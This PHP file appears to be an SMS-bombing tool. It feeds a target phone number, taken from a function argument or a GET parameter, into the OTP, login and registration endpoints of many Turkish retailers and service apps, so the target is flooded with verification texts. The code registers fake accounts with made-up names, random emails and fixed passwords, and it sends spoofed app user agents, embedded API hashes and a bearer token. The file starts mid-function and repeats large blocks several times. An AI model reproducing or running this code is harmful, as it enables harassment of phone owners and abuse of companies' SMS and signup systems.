                                            $data = array("abroadcompanies" => ["1", "2", "3"], "birthdate" => "1975-08-31T22:00:00.000Z", "cardtc$tc" => null, "commencisRadio" => "true", "email" => $email, "firstName" => "Memati", "googleRadio" => "true", "lastName" => "Bas", "microsoftRadio" => "true", "mobilePhone" => $tc, "opetKvkkAndEtk" => true, "plate" => "31ABC31");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }


                                        function N11($tc)
                                        {
                                            $salt = md5(rand(1, 9));
                                            $result = substr($salt, 1, 10);
                                            $email = $result . "@gmail.com";
                                            $headr = array();
                                            $headr[] = 'Mobileclient: IOS';
                                            $headr[] = 'Content-Type: application/json';
                                            $headr[] = 'Accept: */*';
                                            $headr[] = 'Authorization: api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F';
                                            $headr[] = 'Clientversion: 163';
                                            $headr[] = 'Accept-Encoding: gzip, deflate';
                                            $headr[] = 'User-Agent: n11/1 CFNetwork/1335.0.3 Darwin/21.6.0';
                                            $headr[] = 'Accept-Language: tr-TR,tr;q=0.9';
                                            $headr[] = 'Connection: close';
                                            $url = 'https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3';
                                            $data = array("__hapc" => "", "_deviceId" => "696B171-031N-4131-315F-9A76BF60368F", "channel" => "MOBILE_IOS", "countryCode" => "+90", "email" => $email, "gsmNumber" => $tc, "userType" => "BUYER");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, $headr);
                                            curl_setopt($ch, CURLOPT_USERAGENT, "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0");
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }


                                        function PinarSu($tc)
                                        {
                                            $headr = array();
                                            $headr[] = 'Devicetype: ios';
                                            $headr[] = 'Content-Type: application/json';
                                            $headr[] = 'Accept: */*';
                                            $headr[] = 'Authorization: bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJJZCI6ImMyZGFiNzVmLTUxNTUtNGQ4NS1iZjkxLWNkYjQxOTkwMTRiZCIsImlzcyI6Imh0dHA6Ly9sb2NhbGhvc3QvIiwiYXVkIjoiaHR0cDovL2xvY2FsaG9zdC8iLCJpYXQiOjE2NzEyODI2NDcsImV4cCI6MTY4MTY1MDY0N30.WkjMSCamAiYXbanSHYE6LxzII-BjZRtjdyYKMcToWHg';
                                            $headr[] = 'Clientversion: 163';
                                            $headr[] = 'Accept-Encoding: gzip, deflate';
                                            $headr[] = 'Level: 40202';
                                            $headr[] = 'Accept-Language: tr-TR,tr;q=0.9';
                                            $headr[] = 'Accountid: 062511D3-BF52-4441-A29B-8250E3900931';
                                            $headr[] = 'User-Agent: Yasam Pinarim/4.2.2 (com.pinarsu.PinarSu; build:11; iOS 15.6.1) Alamofire/4.2.2';
                                            $headr[] = 'Languageid: D4FF115D-1AB5-4141-8719-A102C3CF9F1E';
                                            $headr[] = 'Connection: close';
                                            $url = 'https://pinarsumobileservice.yasar.com.tr:443/pinarsu-mobil/api/Customer/SendOtp';
                                            $data = array("MobilePhone" => $tc);
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, $headr);
                                            curl_setopt($ch, CURLOPT_USERAGENT, "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0");
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }function Migros($tc)
                                        {
                                            $url = 'https://rest.migros.com.tr:443/sanalmarket/users/login/otp';
                                            $data = array("phoneNumber" => "$tc");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function Sakasu($tc)
                                        {
                                            $url = 'https://mobilcrm2.saka.com.tr:443/api/customer/login';
                                            $data = array("gsm" => "$tc");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function Koctas($tc)
                                        {
                                            $ch = curl_init();
                                            curl_setopt($ch, CURLOPT_URL, "https://occ2.koctas.com.tr:443/koctaswebservices/v2/koctas/registerParo/get-register-parocard-otp");
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt(
                                                $ch,
                                                CURLOPT_POSTFIELDS,
                                                "givePermission=true&mobileNumber=$tc"
                                            );
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                            $server_output = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function A101($tc)
                                        {
                                            $ch = curl_init();
                                            curl_setopt($ch, CURLOPT_URL, "https://www.a101.com.tr:443/users/otp-login/");
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            curl_setopt(
                                                $ch,
                                                CURLOPT_POSTFIELDS,
                                                "phone=0$tc&next=/a101-kapida"
                                            );
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                            $server_output = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function KahveDunyasi($tc)
                                        {
                                            $ch = curl_init();
                                            curl_setopt($ch, CURLOPT_URL, "https://core.kahvedunyasi.com/api/users/sms/send");
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            curl_setopt(
                                                $ch,
                                                CURLOPT_POSTFIELDS,
                                                "mobile_number=$tc&token_type=register_token"
                                            );
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                            $server_output = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function IPApp($tc)
                                        {
                                            $url = 'https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp';
                                            $data = array("birthDate" => "31/08/1975", "carPlate" => "31 ABC 31", "name" => "Memati Bas", "otp" => "", "phoneNumber" => $tc, "playerId" => "");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function NaosStars($tc)
                                        {
                                            $salt = md5(rand(1, 9));
                                            $result = substr($salt, 1, 10);
                                            $email = $result . "@gmail.com";
                                            $ch = curl_init();
                                            curl_setopt($ch, CURLOPT_URL, "https://shop.naosstars.com/users/register/");
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            curl_setopt(
                                                $ch,
                                                CURLOPT_POSTFIELDS,
                                                "email=$email&first_name=Memati&last_name=Bas&password=31ABC..abc31&date_of_birth=1975-12-31&phone=0$tc&gender=male&kvkk=true&contact=true&confirm=true"
                                            );
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                            $server_output = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function Aygaz($tc)
                                        {
                                            $salt = md5(rand(1, 9));
                                            $result = substr($salt, 1, 10);
                                            $email = $result . "@gmail.com";
                                            $url = 'https://mogazmobilapinew.aygaz.com.tr:443/api/Member/UserRegister';
                                            $data = array("address" => "", "birthDate" => "31-08-1975", "city" => 0, "deviceCode" => "839C5FAF-A7C1-2CDA--6F5414AD2228", "district" => 0, "email" => $email, "isUserAgreement" => True, "name" => "Memati", "password" => "", "phone" => $tc, "productType" => 1, "subscription" => True, "surname" => "Bas");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function KimGb($tc)
                                        {
                                            $url = 'https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp';
                                            $data = array("msisdn" => "90$tc");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function EnglishHome($tc)
                                        {
                                            $salt = md5(rand(1, 9));
                                            $result = substr($salt, 1, 10);
                                            $email = $result . "@gmail.com";
                                            $ch = curl_init();
                                            curl_setopt($ch, CURLOPT_URL, "https://www.englishhome.com:443/enh_app/users/registration/");
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            curl_setopt(
                                                $ch,
                                                CURLOPT_POSTFIELDS,
                                                "first_name=Memati&last_name=Bas&email=$email&phone=0$tc&password=31ABC..abc31&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true"
                                            );
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                            $server_output = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function Uludag($tc)
                                        {
                                            file_get_contents("https://bilet.balikesiruludag.com.tr:443/mobil/UyeOlKontrol.php?CepTelefon=$tc");
                                        }

                                        function Pisir($tc)
                                        {
                                            $salt = md5(rand(1, 9));
                                            $result = substr($salt, 1, 10);
                                            $email = $result . "@gmail.com";
                                            $url = 'https://api.pisir.com:443/v1/login/';
                                            $data = array("app_build" => "343", "app_platform" => "ios", "msisdn" => "$tc");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }


                                        function Defacto($tc)
                                        {
                                            $url = 'https://www.defacto.com.tr:443/Customer/SendPhoneConfirmationSms';
                                            $data = array("mobilePhone" => "$tc");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function Opet($tc)
                                        {
                                            $salt = md5(rand(1, 9));
                                            $result = substr($salt, 1, 10);
                                            $email = $result . "@gmail.com";
                                            $url = 'https://api.opet.com.tr:443/api/authentication/register';
                                            $data = array("abroadcompanies" => ["1", "2", "3"], "birthdate" => "1975-08-31T22:00:00.000Z", "cardtc$tc" => null, "commencisRadio" => "true", "email" => $email, "firstName" => "Memati", "googleRadio" => "true", "lastName" => "Bas", "microsoftRadio" => "true", "mobilePhone" => $tc, "opetKvkkAndEtk" => true, "plate" => "31ABC31");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }


                                        function N11($tc)
                                        {
                                            $salt = md5(rand(1, 9));
                                            $result = substr($salt, 1, 10);
                                            $email = $result . "@gmail.com";
                                            $headr = array();
                                            $headr[] = 'Mobileclient: IOS';
                                            $headr[] = 'Content-Type: application/json';
                                            $headr[] = 'Accept: */*';
                                            $headr[] = 'Authorization: api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F';
                                            $headr[] = 'Clientversion: 163';
                                            $headr[] = 'Accept-Encoding: gzip, deflate';
                                            $headr[] = 'User-Agent: n11/1 CFNetwork/1335.0.3 Darwin/21.6.0';
                                            $headr[] = 'Accept-Language: tr-TR,tr;q=0.9';
                                            $headr[] = 'Connection: close';
                                            $url = 'https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3';
                                            $data = array("__hapc" => "", "_deviceId" => "696B171-031N-4131-315F-9A76BF60368F", "channel" => "MOBILE_IOS", "countryCode" => "+90", "email" => $email, "gsmNumber" => $tc, "userType" => "BUYER");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, $headr);
                                            curl_setopt($ch, CURLOPT_USERAGENT, "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0");
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }


                                        function PinarSu($tc)
                                        {
                                            $headr = array();
                                            $headr[] = 'Devicetype: ios';
                                            $headr[] = 'Content-Type: application/json';
                                            $headr[] = 'Accept: */*';
                                            $headr[] = 'Authorization: bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJJZCI6ImMyZGFiNzVmLTUxNTUtNGQ4NS1iZjkxLWNkYjQxOTkwMTRiZCIsImlzcyI6Imh0dHA6Ly9sb2NhbGhvc3QvIiwiYXVkIjoiaHR0cDovL2xvY2FsaG9zdC8iLCJpYXQiOjE2NzEyODI2NDcsImV4cCI6MTY4MTY1MDY0N30.WkjMSCamAiYXbanSHYE6LxzII-BjZRtjdyYKMcToWHg';
                                            $headr[] = 'Clientversion: 163';
                                            $headr[] = 'Accept-Encoding: gzip, deflate';
                                            $headr[] = 'Level: 40202';
                                            $headr[] = 'Accept-Language: tr-TR,tr;q=0.9';
                                            $headr[] = 'Accountid: 062511D3-BF52-4441-A29B-8250E3900931';
                                            $headr[] = 'User-Agent: Yasam Pinarim/4.2.2 (com.pinarsu.PinarSu; build:11; iOS 15.6.1) Alamofire/4.2.2';
                                            $headr[] = 'Languageid: D4FF115D-1AB5-4141-8719-A102C3CF9F1E';
                                            $headr[] = 'Connection: close';
                                            $url = 'https://pinarsumobileservice.yasar.com.tr:443/pinarsu-mobil/api/Customer/SendOtp';
                                            $data = array("MobilePhone" => $tc);
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, $headr);
                                            curl_setopt($ch, CURLOPT_USERAGENT, "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0");
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
